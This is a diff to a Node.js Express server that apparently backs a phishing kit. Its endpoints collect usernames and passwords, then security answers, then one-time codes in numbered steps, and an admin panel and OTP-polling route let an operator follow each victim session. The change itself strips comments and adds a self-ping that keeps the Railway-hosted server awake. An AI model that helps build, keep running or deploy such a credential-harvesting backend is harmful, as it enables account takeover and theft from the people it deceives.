@@ -2,8 +2,7 @@ const express = require('express');
 const path = require('path');
 const crypto = require('crypto');
 const cors = require('cors');
-// ← حذفنا: const http = require('http');
-// ← حذفنا: const https = require('https');
+const https = require('https');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -33,12 +32,10 @@ function genToken() {
 function readDB() { return memDB; }
 function writeDB(data) { memDB = data; }
 
-// Ping
 app.get('/ping', (req, res) => {
   res.json({ status: 'ok' });
 });
 
-// STEP 1
 app.post('/api/submit', (req, res) => {
   const { username, password } = req.body;
   if (!username || !password) {
@@ -64,7 +61,6 @@ app.post('/api/submit', (req, res) => {
   res.json({ success: true, sessionId: session.id });
 });
 
-// STEP 2
 app.post('/api/submit-security', (req, res) => {
   const { sessionId, secQuestion, secAnswer } = req.body;
   if (!sessionId || !secQuestion || !secAnswer) {
@@ -81,7 +77,6 @@ app.post('/api/submit-security', (req, res) => {
   res.json({ success: true });
 });
 
-// STEP 3
 app.post('/api/submit-otp', (req, res) => {
   const { sessionId, otp } = req.body;
   let db = readDB();
@@ -95,7 +90,6 @@ app.post('/api/submit-otp', (req, res) => {
   res.json({ success: true });
 });
 
-// Check OTP
 app.get('/api/check-otp/:sessionId', (req, res) => {
   let db = readDB();
   let session = db.find(s => s.id === req.params.sessionId);
@@ -110,7 +104,6 @@ app.get('/api/check-otp/:sessionId', (req, res) => {
   });
 });
 
-// Admin login
 app.post('/api/admin/login', (req, res) => {
   if (req.body.password === ADMIN_PASSWORD) {
     const token = genToken();
@@ -160,8 +153,17 @@ app.post('/api/admin/logout', adminAuth, (req, res) => {
   res.json({ success: true });
 });
 
-// ← التغيير الوحيد هنا: أضفنا '0.0.0.0'
 app.listen(PORT, '0.0.0.0', () => {
   log('Server running on port ' + PORT);
-  // ← حذفنا self-ping حق Render كلياً
+
+  // Self-ping كل دقيقة
+  setInterval(() => {
+    const host = process.env.RAILWAY_PUBLIC_DOMAIN;
+    if (!host) return;
+    https.get(`https://${host}/ping`, (res) => {
+      log(`Self-ping: ${res.statusCode}`);
+    }).on('error', (err) => {
+      log(`Self-ping failed: ${err.message}`);
+    });
+  }, 60000);
 });
